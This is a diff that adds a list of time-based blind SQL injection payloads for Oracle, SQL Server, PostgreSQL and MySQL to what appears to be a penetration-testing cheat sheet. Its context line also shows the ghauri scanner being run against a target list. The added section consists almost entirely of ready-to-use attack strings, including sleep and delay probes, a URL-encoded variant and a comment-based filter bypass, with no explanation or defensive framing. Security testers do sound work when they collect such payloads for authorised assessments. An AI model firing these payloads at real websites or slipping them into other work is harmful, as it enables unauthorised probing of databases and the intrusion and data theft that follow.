@@ -155,4 +155,33 @@ ghauri -m targets.txt --batch --dbs --level 3 --confirm --technique T --threads 
 
 ===================================================================================================================
 
+Oracle database time-based injection payload
+SELECT dbms_pipe.receive_message(('a'),10) FROM dual
+
+Microsoft SQL Server time-based injection payload
+WAITFOR DELAY '0:0:10'
+
+PostgreSQL time-based injection payload
+SELECT pg_sleep(10)
+
+MySQL time-based injection payload
+SELECT sleep(10)
+
+MySQL alternative time-based payload with URL encoding
+0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z
+
+PostgreSQL complex time-based injection payload
+'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1
+
+MySQL multi-condition time-based payload with comment bypass
+if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(now()=sysdate(),sleep(10),0))OR'*/
+
+Combined MySQL and MSSQL time-based payload
+1234 AND SLEEP(10)';WAITFOR DELAY '00:00:05';--
+
+Numeric parameter time-based injection payload
+paramname=1'-IF(1=1,SLEEP(10),0) AND paramname='1
+
+===================================================================================================================
+
 
